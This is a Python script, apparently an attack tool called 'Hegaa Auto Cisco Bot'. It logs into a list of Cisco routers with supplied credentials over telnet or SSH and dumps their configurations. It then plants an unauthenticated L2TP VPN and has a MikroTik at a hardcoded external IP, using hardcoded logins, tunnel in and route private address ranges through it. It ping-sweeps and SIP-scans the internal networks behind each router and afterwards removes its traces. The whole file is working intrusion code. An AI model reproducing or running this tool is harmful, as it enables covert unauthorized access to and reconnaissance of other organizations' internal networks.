# hegaa

import sys, os, time, telnetlib
import re
import random
import string
from subprocess import PIPE, Popen, run
from netaddr import *
import paramiko
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)

W = '\u001b[37m'
B = '\u001b[34;1m'
R = '\u001b[31;1m'
G = '\u001b[33;1m'



class Telcc:
    def __init__(self, fullHostInfo):
        splitHost = fullHostInfo.split(":")
        self.FHI = fullHostInfo
        self.HOST = splitHost[0]
        self.port = 23
        self.net = telnetlib.Telnet(self.HOST, self.port, timeout=10)
        self.getConicToCisco(self.FHI, self.net)

    def getConicToCisco(self, fullHostInf, t):

        try:
            splitHost = fullHostInf.split(":")
            username = splitHost[2]
            passw = splitHost[3]
            epassw = splitHost[4]
            enable = "en"
            hoste = fullHostInf

            hoho = ''
            hoho += str(t.read_until(b'login:', 6))

            def login(username):
                res = ''
                res += str(t.read_until(b'>', 6))

                if '>' in res:
                    t.write(enable.encode('utf-8'))
                    t.write(b'\r')
                    t.read_until(b'ssword:', 6)
                    t.write(epassw.encode('utf-8'))
                    t.write(b'\r')

                elif '#' in res:
                    t.write(b'\r')


                else:
                    print("Fucked up")
                    t.close()

                res2 = ''
                res2 += str(t.read_until(b'>', 6))

                if '#' in res2:
                    if username == "":
                        username = "No_user"

                    try:
                        t.write(b"terminal length 0\n")

                    except:
                        pass

                    try:
                        t.write(b"terminal pager 0\n")

                    except:
                        pass

                else:
                    BadLogin = open("Bad_login_Cisco.txt", 'a')
                    BadLogin.write(fullHostInf + "\n")
                    BadLogin.flush()
                    t.close()

            if "ername:" in str(hoho):
                t.write(username.encode('utf-8'))
                t.write(b'\r')
                t.read_until(b'ssword:', 6)
                t.write(passw.encode('utf-8'))
                t.write(b'\r')
                login(username)

            elif "assword:" in str(hoho):
                t.write(passw.encode('utf-8'))
                t.write(b'\r')
                username = ''
                login(username)

            else:
                t.close()

        except:
            pass

    def chekLogin(self):
        time.sleep(1)
        res2 = ''
        res2 += str(self.net.read_until(b'>', 6))

        if '#' in res2:
            return "GooD"
        else:
            return "BaaD"

    def sendcmd(self, command):
        self.net.write(command.encode('ascii') + b"\n")
        response = self.net.read_until(b")", 10).decode('ascii')
        return response

    def setupVpn(self, intF, locoIp, ciscus, cicpass):
        print("\u001b[33;1m[+] Start Cisco setupVpn \u001b[37m")
        self.net.write("configure terminal".encode('ascii') + b"\n")

        self.net.read_until(b")", 10).decode('ascii')
        self.net.write("vpdn enable".encode('ascii') + b"\n")
        self.net.read_until(b")", 10).decode('ascii')
        # vpdn-group
        self.net.write("vpdn-group 35".encode('ascii') + b"\n")
        self.net.read_until(b")", 10).decode('ascii')
        self.net.write("accept-dialin".encode('ascii') + b"\n")
        self.net.read_until(b")", 10).decode('ascii')
        self.net.write("protocol l2tp".encode('ascii') + b"\n")
        self.net.read_until(b")", 10).decode('ascii')
        self.net.write("virtual-template 35".encode('ascii') + b"\n")
        self.net.read_until(b")", 10).decode('ascii')
        self.net.write("no l2tp tunnel authentication".encode('ascii') + b"\n")
        self.net.read_until(b")", 10).decode('ascii')
        self.net.write("exit".encode('ascii') + b"\n")
        self.net.read_until(b")", 10).decode('ascii')

        # interface Virtual-Template
        self.net.write("interface Virtual-Template 35".encode('ascii') + b"\n")
        self.net.read_until(b")", 10).decode('ascii')
        intll = " ip unnumbered %s" % (intF)
        self.net.write(intll.encode('ascii') + b"\n")
        self.net.read_until(b")", 10).decode('ascii')
        self.net.write(" peer default ip address pool LT2P-P".encode('ascii') + b"\n")
        self.net.read_until(b")", 10).decode('ascii')
        self.net.write("ip nat inside".encode('ascii') + b"\n")
        self.net.read_until(b")", 10).decode('ascii')
        self.net.write("ip virtual-reassembly in".encode('ascii') + b"\n")
        self.net.read_until(b")", 10).decode('ascii')
        self.net.write("ip route-cache flow".encode('ascii') + b"\n")
        self.net.read_until(b")", 10).decode('ascii')
        self.net.write("keepalive 5".encode('ascii') + b"\n")
        self.net.read_until(b")", 10).decode('ascii')
        self.net.write(" exit".encode('ascii') + b"\n")

        # ip pool and username
        self.net.read_until(b")", 10).decode('ascii')
        self.net.write(f"username {ciscus} password {cicpass}".encode('ascii') + b"\n")
        self.net.read_until(b")", 10).decode('ascii')
        poolL = "ip local pool LT2P-P %s.130 %s.135" % (locoIp, locoIp)
        self.net.write(poolL.encode('ascii') + b"\n")
        self.net.read_until(b")", 10).decode('ascii')
        self.net.write("end".encode('ascii') + b"\n")

        response = self.net.read_until(b")", 10).decode('ascii')

    def reloadCis(self, ciscus):
        print("\u001b[31;1m[-] Reload Cisco : ", self.FHI, '\u001b[37m')

        self.net.write("conf t".encode('ascii') + b"\n")
        self.net.read_until(b")", 10).decode('ascii')
        self.net.write("no vpdn-group 35".encode('ascii') + b"\n")
        self.net.read_until(b")", 10).decode('ascii')
        self.net.write("no interface Virtual-Template 35".encode('ascii') + b"\n")
        self.net.read_until(b")", 10).decode('ascii')
        self.net.write("no ip local pool LT2P-P".encode('ascii') + b"\n")
        self.net.read_until(b")", 10).decode('ascii')
        self.net.write(f"no username {ciscus}".encode('ascii') + b"\n")
        self.net.write("\n".encode('ascii') + b"\n")
        self.net.read_until(b")", 10).decode('ascii')

        # self.net.write("reload".encode('ascii') + b"\n")
        # self.net.read_until(b")", 10).decode('ascii')
        # self.net.write("no".encode('ascii') + b"\n")
        # self.net.read_until(b")", 10).decode('ascii')
        # self.net.write("\n".encode('ascii') + b"\n")

    def CloseTelCon(self):
        print("\u001b[31;1m[-] Closing Telnet To : ", self.FHI, '\u001b[37m')
        self.net.close()

class SSHcc:
    def __init__(self, fullHostInfo):
        splitHost = fullHostInfo.split(":")
        self.SSH = paramiko.SSHClient()
        self.SSH.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.FHI = fullHostInfo
        self.HOST = splitHost[0]
        self.user = splitHost[2]
        self.password = splitHost[3]
        self.Epassword = splitHost[4]
        self.port = 22
        self.net = self.SSH.connect(self.HOST, username=self.user, password=self.password, port=self.port, timeout=240, banner_timeout=250, auth_timeout=500)
        self.Con = self.SSH.invoke_shell()
        self.getConicToCisco(self.FHI, self.net)

    def getConicToCisco(self, fullHostInfo, SSH_Con):

        try:
            ip = self.HOST
            port = self.port
            user = self.user
            password = self.password
            EnableP = self.Epassword
            hoste = fullHostInfo
            IP_PORT = str(ip) + ":" + str(port)

            def commandSHH(ConT, cmd, routerType, timeout):
                FirstScR = ""
                LastScR = ""
                ConT.send(bytes(cmd + "\x0D", 'utf-8'))
                time.sleep(2)
                timery = time.perf_counter()
                if (routerType == "Cisco"):
                    tempScrn = ConT.recv(65100).decode('ascii')
                    if (LastScR != tempScrn):
                        FirstScR += tempScrn
                        LastScR = tempScrn
                    arrTmp = tempScrn.split('\r\n')
                    arrTmp.reverse()

                    # arrTmp = []
                return FirstScR

            # SSH_Con = self.SSH.invoke_shell()
            Result_F_Run = self.Con.recv(10000).decode(encoding='utf-8')
            time.sleep(1)
            if '#' in str(Result_F_Run):
                print('\u001b[33;1m[+] success login ' + hoste + "\u001b[37m")
                commandSHH(self.Con, "terminal length 0", "Cisco", 200)
                time.sleep(1)
                commandSHH(self.Con, "terminal pager 0", "Cisco", 200)

            elif '>' in Result_F_Run:
                self.Con.send("enable\n")
                Result_F_Run1 = self.Con.recv(10000).decode(encoding='utf-8')
                if 'ssword:' in Result_F_Run1:
                    self.Con.send(EnableP + "\n")
                    Result_F_Run2 = self.Con.recv(10000).decode(encoding='utf-8')
                    if '#' in Result_F_Run2:
                        print('\u001b[33;1m[+] success login ' + hoste + "\u001b[37m")
                        commandSHH(self.Con, "terminal length 0", "Cisco", 200)
                        time.sleep(1)
                        commandSHH(self.Con, "terminal pager 0", "Cisco", 200)

                elif '#' in Result_F_Run:
                    print('\u001b[33;1m[+] success login ' + hoste + "\u001b[37m")
                    commandSHH(self.Con, "terminal length 0", "Cisco", 200)
                    time.sleep(1)
                    commandSHH(self.Con, "terminal pager 0", "Cisco", 200)
                else:
                    self.Con.close()
                    self.SSH.close()
            else:
                self.Con.close()
                self.SSH.close()

        except:
            pass

    def chekLogin(self):
        command = "show privilege"

        FirstScR = ""
        LastScR = ""

        self.Con.send(bytes(command + "\x0D", 'utf-8'))
        time.sleep(2)
        tempScrn = self.Con.recv(65100).decode('ascii')
        if (LastScR != tempScrn):
            FirstScR += tempScrn
            LastScR = tempScrn
        arrTmp = tempScrn.split('\r\n')
        arrTmp.reverse()

        if '#' in FirstScR:
            # return "Good"
            return "GooD"
        else:
            return "BaaD"

    def sendcmd(self, command):

        FirstScR = ""
        LastScR = ""

        self.Con.send(bytes(command + "\x0D", 'utf-8'))
        time.sleep(2)
        tempScrn = self.Con.recv(65100).decode('ascii')
        if (LastScR != tempScrn):
            FirstScR += tempScrn
            LastScR = tempScrn
        arrTmp = tempScrn.split('\r\n')
        arrTmp.reverse()
        return FirstScR

    def setupVpn(self, intF, locoIp, ciscus, cicpass):
        print("\u001b[33;1m[+] Start Cisco setupVpn \u001b[37m")
        self.Con.send(bytes("configure terminal" + "\x0D", 'utf-8'))
        time.sleep(1)
        self.Con.send(bytes("vpdn enable" + "\x0D", 'utf-8'))
        time.sleep(1)

        # vpdn-group
        self.Con.send(bytes("vpdn-group 35" + "\x0D", 'utf-8'))
        time.sleep(1)
        self.Con.send(bytes("accept-dialin" + "\x0D", 'utf-8'))
        time.sleep(1)
        self.Con.send(bytes("protocol l2tp" + "\x0D", 'utf-8'))
        time.sleep(1)
        self.Con.send(bytes("virtual-template 35" + "\x0D", 'utf-8'))
        time.sleep(1)
        self.Con.send(bytes("no l2tp tunnel authentication" + "\x0D", 'utf-8'))
        time.sleep(1)
        self.Con.send(bytes("exit" + "\x0D", 'utf-8'))
        time.sleep(1)

        # interface Virtual-Template
        self.Con.send(bytes("interface Virtual-Template 35" + "\x0D", 'utf-8'))
        time.sleep(1)
        intll = " ip unnumbered %s" % (intF)
        self.Con.send(bytes(intll + "\x0D", 'utf-8'))
        time.sleep(1)
        self.Con.send(bytes("peer default ip address pool LT2P-P" + "\x0D", 'utf-8'))
        time.sleep(1)
        self.Con.send(bytes("ip nat inside" + "\x0D", 'utf-8'))
        time.sleep(1)
        self.Con.send(bytes("ip virtual-reassembly in" + "\x0D", 'utf-8'))
        time.sleep(1)
        self.Con.send(bytes("ip route-cache flow" + "\x0D", 'utf-8'))
        time.sleep(1)
        self.Con.send(bytes("keepalive 5" + "\x0D", 'utf-8'))
        time.sleep(1)
        self.Con.send(bytes("exit" + "\x0D", 'utf-8'))
        time.sleep(1)

        # ip pool and username
        self.Con.send(bytes(f"username {ciscus} password {cicpass}" + "\x0D", 'utf-8'))
        time.sleep(1)
        poolL = "ip local pool LT2P-P %s.130 %s.135" % (locoIp, locoIp)
        self.Con.send(bytes(poolL + "\x0D", 'utf-8'))
        time.sleep(1)
        self.Con.send(bytes("end" + "\x0D", 'utf-8'))
        time.sleep(1)

    def reloadCis(self, ciscus):
        print("\u001b[31;1m[-] Reload Cisco : ", self.FHI, '\u001b[37m')

        self.Con.send(bytes("conf t" + "\x0D", 'utf-8'))
        time.sleep(1)
        self.Con.send(bytes("no vpdn-group 35" + "\x0D", 'utf-8'))
        time.sleep(1)
        self.Con.send(bytes("no interface Virtual-Template 35" + "\x0D", 'utf-8'))
        time.sleep(1)
        self.Con.send(bytes("no ip local pool LT2P-P" + "\x0D", 'utf-8'))
        time.sleep(1)
        self.Con.send(bytes(f"no username {ciscus}" + "\x0D", 'utf-8'))
        self.Con.send(bytes("\n" + "\x0D", 'utf-8'))
        time.sleep(1)


        # self.Con.send(bytes("reload" + "\x0D", 'utf-8'))
        # time.sleep(1)
        # self.Con.send(bytes("no" + "\x0D", 'utf-8'))
        # time.sleep(1)
        # self.Con.send(bytes("\n" + "\x0D", 'utf-8'))
        # time.sleep(1)

    def CloseTelCon(self):
        self.Con.close()
        self.SSH.close()

class TelMikro:
    def __init__(self):
        self.HOST = "45.11.183.190"
        self.port = 5051
        self.net = telnetlib.Telnet(self.HOST, self.port, timeout=10)
        self.getConicToMikro(self.net)

    def getConicToMikro(self, tn):

        try:
            def login():
                # print("\u001b[33;1m[+] Login to MikroTik \u001b[37m")
                user = "BotMan159"
                password = "BotMan1592468"
                # tn.read_until(b"Login: ")
                tn.write(user.encode('UTF-8') + b"\n")
                # input password
                tn.read_until(b"Password: ")
                tn.write(password.encode('UTF-8') + b"\n")
                tn.read_until(b")", 10)
                tn.write(b"\n" + b"\n")

            jackLoing = tn.read_until(b"Login: ")
            if "Login" in str(jackLoing):
                login()

        except:
            pass

    def addPptpCli(self, cicIp, ciscus, cicpass):
        print("\u001b[33;1m[+] Add LT2P Cli  \u001b[37m")
        self.net.write(b"\r\n")
        self.net.read_until(b'>')
        mtcommand = f"/interface l2tp-client add connect-to={cicIp} disabled=no name=LT2PT password={cicpass} user={ciscus}"
        self.net.write(mtcommand.encode('UTF-8') + b"\r\n")
        time.sleep(5)
        # print("\u001b[33;1m[+] Done Adding LT2P Cli to MikroTik \u001b[37m")

    def addIpRoute(self):
        # print("\u001b[33;1m[+] Start Add Ip Route to MikroTik \u001b[37m")
        ipsLi = ["192.168.0.0/16", "10.0.0.0/8", "172.0.0.0/8"]
        self.net.write(b"\r\n")
        for Ip in ipsLi:
            self.net.read_until(b'>')
            mtcommand = "ip route add dst-address=%s gateway=LT2PT" % (Ip)
            self.net.write(mtcommand.encode('UTF-8') + b"\r\n")
            self.net.write(b"\r\n")
            time.sleep(1)

    def removPPtAIR(self):
        # print("\u001b[31;1m[-] Start Removing Ip Routes and LT2P Cli from MikroTik \u001b[37m")
        # mtcommand1 = "ip route remove [find gateway=\"unknown\"]"
        mtcommand2 = "/interface l2tp-client remove [/interface find name=\"LT2PT\"]"

        self.net.write(b"\r\n")
        time.sleep(1)
        self.net.read_until(b'>')
        self.net.write(mtcommand2.encode('UTF-8') + b"\r\n")
        self.net.write(b"\r\n")
        time.sleep(1)
        self.net.read_until(b'>')

    def chkPPCS(self):
        # /interface pptp-client monitor "PPBPT"
        print("\u001b[33;1m[+] Trying to Connect LT2P Cli ... 60 SIC \u001b[37m")
        mtcommands = "/interface l2tp-client monitor \"LT2PT\""
        for i in range(60):
            self.net.write(b"\r\n")
            self.net.read_until(b'>')
            time.sleep(1)
            self.net.write(mtcommands.encode('UTF-8') + b"\r\n")
            time.sleep(1)
            self.net.write(b"q\r\n")
            time.sleep(1)
            jackstat = self.net.read_until(b'Q quit')
            if " connected" in str(jackstat) and "disconnected" not in str(jackstat):
                print("\u001b[33;1m[+] LT2P Cli Connected  \u001b[37m")
                return "GooD"
            elif (i == 50):
                if " connected" not in str(jackstat) or "disconnected" in str(jackstat):
                    print("\u001b[31;1m[-] LT2P Cli Not Connected \u001b[37m")
                    break
            #  console clear-history
            clsComm = "console clear-history"
            self.net.read_until(b'>')
            self.net.write(clsComm.encode('UTF-8') + b"\r\n")

    def CloseTelConToMikro(self):
        # print("\u001b[31;1m[-] Closing Telnet To : MikroTik \u001b[37m")
        self.net.close()

def generate_random_text():
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for _ in range(8))

def chIntAIp(cmdoutput):
    response = [text.strip() for text in cmdoutput.splitlines()]
    VlanS = []
    locInt = []
    for line in response:
        Vlino = line.split()
        if len(Vlino) == 6:
            if (Vlino[4] == "up") and (Vlino[5] == "up"):
                match = re.search(r'Vlan', line)
                if match:
                    if (Vlino[1].split(".")[0] == "192") or (Vlino[1].split(".")[0] == "10") or (Vlino[1].split(".")[0] == "172"):
                        VlanS.append(line)

                if (Vlino[1].split(".")[0] == "192") or (Vlino[1].split(".")[0] == "10") or (Vlino[1].split(".")[0] == "172"):
                    locInt.append(line)

    MixIn = []
    if len(VlanS) > 0:
        for Vlin in VlanS:
            Vlino = Vlin.split()
            Viki = Vlino[0] + ":" + Vlino[1]
            MixIn.append(Viki)

    if len(locInt) > 0:
        for loki in locInt:
            loclino = loki.split()
            VikiL = loclino[0] + ":" + loclino[1]
            MixIn.append(VikiL)
    if len(MixIn) > 0:
        return MixIn
    else:
        return "BaaD"

def Clea24(Garbs):
    try:
        Garb = [text.strip() for text in Garbs.splitlines()]
        pattern = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
        IpsArry = []
        for line in Garb:
            try:
                # sako = pattern.search(line)[0]
                sako = pattern.findall(line)
                for sek in sako:
                    Fline = str(sek).split(".")
                    if (Fline[0] != "0"):
                        FinLine = Fline[0] + "." + Fline[1] + "." + Fline[2] + ".0/24"
                        IpsArry.append(FinLine)

            except:
                pass

        res = []
        resF = []
        for i in IpsArry:
            if i not in res:
                res.append(i)
        for fako in res:
            zak = fako.split(".")
            if ("255.255" not in fako):
                if (zak[0] == '10') or (zak[0] == '192') or (zak[0] == '172'):
                    resF.append(fako)

        return resF

    except:
        pass

def out(command):
    result = run(command, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
    return result.stdout

def fpingScan(jack24):
    try:
        if os.path.exists("Live.txt"):
            os.remove("Live.txt")
    except:
        pass

    ThreadNumber = 20
    val = open('Live.txt', 'a')
    with open('ips-f.txt', 'r') as ipf:
        ipff = ipf.read().splitlines()

    ipfs = []
    for iprl in jack24:
        ipfs.append(str(iprl))
    for iprl2 in ipff:
        ipfs.append(str(iprl2))

    def pping(ipRange):
        try:
            print("[P] Fucking ==>", ipRange)
            ip1 = IPNetwork(ipRange)[0]
            ip2 = IPNetwork(ipRange)[-1]
            cmdo = "Lib\\fping.exe -g " + str(ip1) + "/" + str(ip2) + " -p " + str(ThreadNumber)
            my_output = out(cmdo)
            pattern = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
            for i in my_output.split("\n"):
                if "Reply" in i and "from" in i and "bytes=" in i:
                    myIp = pattern.search(i)[0]
                    print("[R] Host " + myIp + " is online")
                    val.write(myIp + "\n")
                    val.flush()
        except:
            pass

    for ipRange in ipfs:
        try:
            pping(ipRange)
        except:
            pass

if __name__ == '__main__':
    with open('IPS.txt', 'r') as numf:
        CiscoIpLIS = numf.read().splitlines()
    os.system('title  Hegaa Auto Cisco Bot XD')
    for CiscoIp in CiscoIpLIS:
        try:
            random_up = generate_random_text()
            if ":23:" in CiscoIp:
                LogF = open("log.txt", 'a')
                LogF.write(CiscoIp + "\n")
                LogF.flush()

                print("\u001b[33;1m[+] Trying ==> ", CiscoIp, "\u001b[37m")
                CiscoIpS = CiscoIp.split(":")
                jackC = Telcc(CiscoIp)
                tryLogin = jackC.chekLogin()

                if tryLogin == "GooD":
                    print("\u001b[33;1m[+] GooD Cisco login to :", CiscoIp, "\u001b[37m")

                    shIpIntB = jackC.sendcmd("sh ip interface brief")
                    shIpRo = jackC.sendcmd("sh ip ro")
                    shIpCef = jackC.sendcmd("sh ip cef")
                    shRunConf = jackC.sendcmd("sh running-config")
                    fullInfCong = shIpIntB + shIpRo + shIpCef + shRunConf

                    jakInIpL = chIntAIp(shIpIntB)

                    if jakInIpL != "BaaD":
                        jackC.CloseTelCon()
                        for jakInIp in jakInIpL:
                            time.sleep(30)
                            try:
                                jackC = Telcc(CiscoIp)

                                print("\u001b[33;1m[+] Int and Ip ==> : ", jakInIp, "\u001b[37m")
                                jakInIpS = jakInIp.split(":")
                                locIp = jakInIpS[1].split(".")[0] + "." + jakInIpS[1].split(".")[1] + "." + \
                                        jakInIpS[1].split(".")[2]

                                # print("Int = >", jakInIpS[0])
                                # print("locIp = >", locIp)

                                jackC.setupVpn(jakInIpS[0], locIp, random_up, random_up)
                                time.sleep(2)

                                jack24 = Clea24(fullInfCong)

                                jackM = TelMikro()
                                jackM.addPptpCli(CiscoIpS[0], random_up, random_up)
                                jackMS = jackM.chkPPCS()

                                if jackMS == "GooD":
                                    jackC.CloseTelCon()

                                    ressF = open("Ress/%s.txt" % (CiscoIpS[0]), 'a')
                                    ressF.write(CiscoIp + "\n\n")
                                    ressF.write("Int and Ip ==> : " + str(jakInIp) + "\n\n")

                                    ressF.write("IP Range ======> : " + "\n\n")
                                    ressF.flush()

                                    for ipR in jack24:
                                        ressF.write(ipR + "\n")
                                        ressF.flush()

                                    ressF.close()

                                    jackM.addIpRoute()
                                    jackM.CloseTelConToMikro()

                                    print(B, "[+] Start Fping Scan ", W)
                                    fpingScan(jack24)

                                    with open('Live.txt', 'r') as ipf:
                                        LiveA = ipf.read().splitlines()

                                    Lives = " "
                                    for LiveLine in LiveA:
                                        Lives += LiveLine

                                    jack24 = Clea24(Lives)

                                    print(B, "[+] Start Server and Title Scan ", W)
                                    ressF = open("Ress/%s.txt" % (CiscoIpS[0]), 'a')
                                    ressF.write("\n\nServer and Title Scan ======> : " + "\n\n")
                                    ressF.close()

                                    for ipR in jack24:
                                        try:
                                            os.system("getServTitle.exe %s %s " % (CiscoIpS[0], ipR))
                                        except:
                                            pass

                                    time.sleep(2)

                                    print(B, "[+] Start SIP Scan ", W)
                                    ressF = open("Ress/%s.txt" % (CiscoIpS[0]), 'a')
                                    ressF.write("\n\nSIP Scan ======> : " + "\n\n")
                                    ressF.close()

                                    for ipR in jack24:
                                        try:
                                            os.system("svmap.exe %s -p 5060,5061,5070,5080,5090 >> Ress/%s.txt" % (ipR, CiscoIpS[0]))
                                        except:
                                            pass

                                    valIP = open("Ress/%s.txt" % CiscoIpS[0], "a")
                                    valIP.write("\n\nLive IPS ======> : " + "\n\n")
                                    valIP.flush()

                                    for LiveLine in LiveA:
                                        valIP.write(LiveLine + "\n")
                                        valIP.flush()
                                    valIP.close()

                                    jackC = Telcc(CiscoIp)
                                    jackC.reloadCis(random_up)

                                    jackM = TelMikro()
                                    jackM.removPPtAIR()
                                    jackM.CloseTelConToMikro()


                                else:
                                    print(B, "[-] LT2P Cli Not Connected ", CiscoIp, W)
                                    f1 = open("Not_Connected_VPN.txt", 'a')
                                    f1.write(CiscoIp + "\n")
                                    f1.flush()

                                    jackM.removPPtAIR()
                                    jackM.CloseTelConToMikro()

                                    jackC.reloadCis(random_up)
                            except:
                                pass

                        # jackM.CloseTelConToMikro()
                    else:
                        print(B, "[-] Can't Make a VPN to", CiscoIp, W)
                        f1 = open("Cant_Make_VPN.txt", 'a')
                        f1.write(CiscoIp + "\n")
                        f1.flush()
                        jackC.CloseTelCon()

                else:
                    f1 = open("No_Cisco_Login.txt", 'a')
                    f1.write(CiscoIp + "\n")
                    f1.flush()
                    jackC.CloseTelCon()
            if ":22:" in CiscoIp:
                LogF = open("log.txt", 'a')
                LogF.write(CiscoIp + "\n")
                LogF.flush()

                print("\u001b[33;1m[+] Trying ==> ", CiscoIp, "\u001b[37m")
                CiscoIpS = CiscoIp.split(":")
                jackC = SSHcc(CiscoIp)
                tryLogin = jackC.chekLogin()

                if tryLogin == "GooD":
                    print("\u001b[33;1m[+] GooD Cisco login to :", CiscoIp, "\u001b[37m")

                    shIpIntB = jackC.sendcmd("sh ip interface brief")
                    shIpRo = jackC.sendcmd("sh ip ro")
                    shIpCef = jackC.sendcmd("sh ip cef")
                    shRunConf = jackC.sendcmd("sh running-config")
                    fullInfCong = shIpIntB + shIpRo + shIpCef + shRunConf

                    jakInIpL = chIntAIp(shIpIntB)

                    if jakInIpL != "BaaD":
                        jackC.CloseTelCon()
                        for jakInIp in jakInIpL:
                            time.sleep(30)
                            try:
                                jackC = SSHcc(CiscoIp)

                                print("\u001b[33;1m[+] Int and Ip ==> : ", jakInIp, "\u001b[37m")
                                jakInIpS = jakInIp.split(":")
                                locIp = jakInIpS[1].split(".")[0] + "." + jakInIpS[1].split(".")[1] + "." + \
                                        jakInIpS[1].split(".")[2]

                                # print("Int = >", jakInIpS[0])
                                # print("locIp = >", locIp)

                                jackC.setupVpn(jakInIpS[0], locIp, random_up, random_up)
                                time.sleep(2)

                                jack24 = Clea24(fullInfCong)

                                jackM = TelMikro()
                                jackM.addPptpCli(CiscoIpS[0], random_up, random_up)
                                jackMS = jackM.chkPPCS()

                                if jackMS == "GooD":
                                    jackC.CloseTelCon()

                                    ressF = open("Ress/%s.txt" % (CiscoIpS[0]), 'a')
                                    ressF.write(CiscoIp + "\n\n")
                                    ressF.write("Int and Ip ==> : " + str(jakInIp) + "\n\n")
                                    ressF.write("IP Range ======> : " + "\n\n")
                                    ressF.flush()

                                    for ipR in jack24:
                                        ressF.write(ipR + "\n")
                                        ressF.flush()

                                    jackM.addIpRoute()
                                    jackM.CloseTelConToMikro()

                                    print(B, "[+] Start Fping Scan ", W)
                                    fpingScan(jack24)

                                    with open('Live.txt', 'r') as ipf:
                                        LiveA = ipf.read().splitlines()

                                    Lives = " "
                                    for LiveLine in LiveA:
                                        Lives += LiveLine

                                    jack24 = Clea24(Lives)


                                    print(B, "[33;1m[+] Start Server and Title Scan ", W)
                                    ressF.write("\n\nServer and Title Scan ======> : " + "\n\n")
                                    ressF.flush()

                                    for ipR in jack24:
                                        try:
                                            os.system("getServTitle.exe %s %s " % (CiscoIpS[0], ipR))
                                        except:
                                            pass

                                    print(B, "[+] Start SIP Scan ", W)
                                    ressF.write("\n\nSIP Scan ======> : " + "\n\n")
                                    ressF.close()

                                    for ipR in jack24:
                                        try:
                                            os.system("svmap.exe %s -p 5060,5061,5070,5080,5090 >> Ress/%s.txt" % (ipR, CiscoIpS[0]))
                                        except:
                                            pass

                                    valIP = open("Ress/%s.txt" % CiscoIpS[0], "a")
                                    valIP.write("\n\nLive IPS ======> : " + "\n\n")
                                    valIP.flush()
                                    for LiveLine in LiveA:
                                        valIP.write(LiveLine + "\n")
                                        valIP.flush()
                                    valIP.close()

                                    jackC = SSHcc(CiscoIp)
                                    jackC.reloadCis(random_up)

                                    jackM = TelMikro()
                                    jackM.removPPtAIR()
                                    jackM.CloseTelConToMikro()


                                else:
                                    print(R, "[31;1m[-] LT2P Cli Not Connected ", CiscoIp, W)
                                    f1 = open("Not_Connected_VPN.txt", 'a')
                                    f1.write(CiscoIp + "\n")
                                    f1.flush()

                                    jackM.removPPtAIR()
                                    jackM.CloseTelConToMikro()

                                    jackC.reloadCis(random_up)
                            except:
                                pass

                        # jackM.CloseTelConToMikro()
                    else:
                        print(R, "[-] Can't Make a VPN to", CiscoIp, W)
                        f1 = open("Cant_Make_VPN.txt", 'a')
                        f1.write(CiscoIp + "\n")
                        f1.flush()
                        jackC.CloseTelCon()

                else:
                    f1 = open("No_Cisco_Login.txt", 'a')
                    f1.write(CiscoIp + "\n")
                    f1.flush()
                    jackC.CloseTelCon()
        except:
            pass
    input("\033[92m [X] Done All IPS File Press Enter To Close \033[0m")
